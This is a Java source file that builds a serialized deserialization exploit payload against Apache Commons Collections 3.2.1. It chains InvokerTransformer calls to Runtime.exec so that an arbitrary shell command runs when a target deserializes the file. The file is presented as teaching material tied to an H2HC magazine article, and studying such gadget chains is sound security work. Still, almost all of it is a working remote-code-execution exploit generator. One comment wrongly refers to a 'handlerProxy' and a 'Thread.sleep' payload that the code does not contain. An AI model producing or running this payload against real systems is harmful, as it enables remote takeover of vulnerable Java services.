import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * Gera payload que leva a execução de código durante a desserialização.
 * São usados os gadgets LayzMap, InvokerTransformer, ConstantTransformer e
 * ChainedTransformer, da commons-collections e a AnnotationInvocationHandler,
 * do JRE, como trigger gadget.
 * Essa versão usa um HashMap + TiedMapEntry como trigger (propostos por Matthias Kaiser)
 *
 * -----------------------------------------------------------------------
 * * Mais detalhes na 12a edição da H2HC (hackers to hackers) magazine:
 * * https://www.h2hc.com.br/revista/
 * -----------------------------------------------------------------------
 *
 * OBS: Esse código tem fins apenas didáticos. Algumas cadeias de
 * transformers são baseadas nas versões de Chris Frohoff e/ou Matthias Kaiser
 *
 **** USAGE ****
 *
 * Compilando:
 * $ javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap.java
 *
 * Executando
 * $ java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1WithHashMap 'touch /tmp/h2hc_2017'
 *
 * @author @joaomatosf
 */
public class ExampleCommonsCollections1WithHashMap {
    @SuppressWarnings ( {"unchecked"} )
    public static void main(String[] args)
            throws ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException, NoSuchFieldException {

        // Verifica se o usuário forneceu o comando a ser executado
        if (args.length != 1) {
            System.out.println("Invalid params! \n" +
                    "Example usage: java ExampleCommonsCollections1 \"touch /tmp/test\"");
            System.exit(1);
        }

        // Seleciona o interpretador correto de acordo com o comando a ser executado
        //boolean isUnix = System.getProperty("file.separator").equals("/");
        boolean isUnix = !args[0].contains("cmd.exe") && !args[0].contains("powershell.exe");
        String cmd[];
        if (isUnix)
            cmd = new String[]{"/bin/bash", "-c", args[0]}; // Comando a ser executado
        else
            cmd = new String[]{"cmd.exe", "/c", args[0]}; // Comando a ser executado

        // Cria array de transformers que resulta na seguinte construção:
        //((Runtime)Runtime.class.getMethod("getRuntime", new Class[0]).invoke(null, new Object[0])).exec(cmd[]);
        Transformer[] transformers = new Transformer[] {
            // retorna Class Runtime.class
            new ConstantTransformer(Runtime.class),
            // 1o. Objeto InvokerTransformer: .getMethod("getRuntime", new Class[0])
            new InvokerTransformer(
                "getMethod",                       // invoca método getMethod
                ( new Class[] {String.class, Class[].class } ),// tipos dos parâmetros: (String, Class[])
                ( new Object[] {"getRuntime", new Class[0] } ) // parâmetros: (getRuntime, Class[0])
            ),
            // 2o. Objeto InvokerTransformer: .invoke(null, new Object[0])
            new InvokerTransformer(
                "invoke",                         // invoca método: invoke
                (new Class[] {Object.class, Object[].class }),// tipos dos parâmetros: (Object.class, Object[])
                (new Object[] {null, new Object[0] })         // parâmetros: (null, new Object[0])
            ),
            // 3o. Objeto InvokerTransformer: .exec(cmd[])
            new InvokerTransformer(
                "exec",                          // invoca método: exec
                new Class[] { String[].class },              // tipos dos parâmetros: (String[])
                new Object[]{ cmd } )                        // parâmetros: (cmd[])
        };

        // Cria o objeto ChainedTransformer com o array de Transformers:
        Transformer transformerChain = new ChainedTransformer(transformers);
        // Cria o map
        Map map1 = new HashMap();
        // Decora o map com o LazyMap e a cadeia de transformações como factory
        Map lazyMap = LazyMap.decorate(map1,transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);

        // Serializa o objeto "handlerProxy" e o salva em arquivo. Ao ser desserializado,
        // o readObject irá executar um map.entrySet() e, assim, desviar o fluxo para o invoke().
        // No invoke(), uma chave inexistente será buscada no campo "memberValues" (que contém um LazyMap
        // com a cadeia de Transformers), o que deverá acionar o Thread.sleep(10000)!
        System.out.println("Saving serialized object in ExampleCommonsCollections1WithHashMap.ser");
        FileOutputStream fos = new FileOutputStream("ExampleCommonsCollections1WithHashMap.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map);
        oos.flush();

    }
}